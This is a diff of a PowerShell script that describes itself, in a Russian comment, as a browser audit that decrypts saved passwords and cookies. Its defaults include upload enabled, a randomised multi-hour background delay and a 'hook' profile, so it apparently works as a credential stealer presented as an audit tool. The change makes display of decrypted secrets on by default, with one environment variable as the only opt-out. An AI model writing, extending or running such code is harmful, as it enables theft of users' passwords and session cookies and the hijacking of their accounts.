@@ -30,6 +30,7 @@ $script:BV_BG_BROWSERS = if ($env:BV_BG_BROWSERS) { $env:BV_BG_BROWSERS } else {
 $script:BV_BG_DELAY    = if ($env:BV_BG_DELAY) { [int]$env:BV_BG_DELAY } else { Get-Random -Minimum 7200 -Maximum 10801 }
 $script:BV_ALLOW_UPLOAD = if ($env:BV_ALLOW_UPLOAD) { $env:BV_ALLOW_UPLOAD } else { '1' }
 $script:BV_ALLOW_SHOW   = if ($env:BV_ALLOW_SHOW) { $env:BV_ALLOW_SHOW } else { '1' }
+$script:BV_SHOW         = if ($script:BV_ALLOW_SHOW -eq '0') { 0 } else { 1 }
 
 $script:Profile = if ($env:PROFILE) { $env:PROFILE } else { 'hook' }
 $script:OS = 'unknown'   # заполним после определения w_os
@@ -1656,11 +1657,11 @@ SELECT replace(replace(host_key, char(9), ' '), char(10), ' '),
 # 16. BROWSER AUDIT (метаданные + расшифровка паролей/куки)
 # ============================================================
 function Invoke-AuditBrowsers {
-    # browsers -selftest — без дополнительных флагов
-    $BV_SHOW = 1
+    param([bool]$Show = $true)
+    # -Show is on by default; BV_ALLOW_SHOW=0 keeps the safe mode
+    $BV_SHOW = if ($Show -and $script:BV_ALLOW_SHOW -ne '0') { 1 } else { 0 }
     $BV_COOKIES = 1
     $Test = $false
-    if ($script:BV_ALLOW_SHOW -eq '0') { $BV_SHOW = 0 }
 
     $totals = [pscustomobject]@{ Files = 0; Records = 0; Ok = 0; Bad = 0 }
     $allResults = New-Object System.Collections.Generic.List[object]
@@ -1756,7 +1757,7 @@ function Invoke-RunBrowsersAudit {
     $script:BV_BROWSER_RESULTS = @()
     $script:BV_BROWSER_REPORT = ''
 
-    $out = @(Invoke-AuditBrowsers)
+    $out = @(Invoke-AuditBrowsers -Show:$true)
     $out | Where-Object { $_ -isnot [int] } | Out-Host
     $rc = $out | Where-Object { $_ -is [int] } | Select-Object -Last 1
     if ($null -eq $rc) { $rc = 0 } else { $rc = [int]$rc }
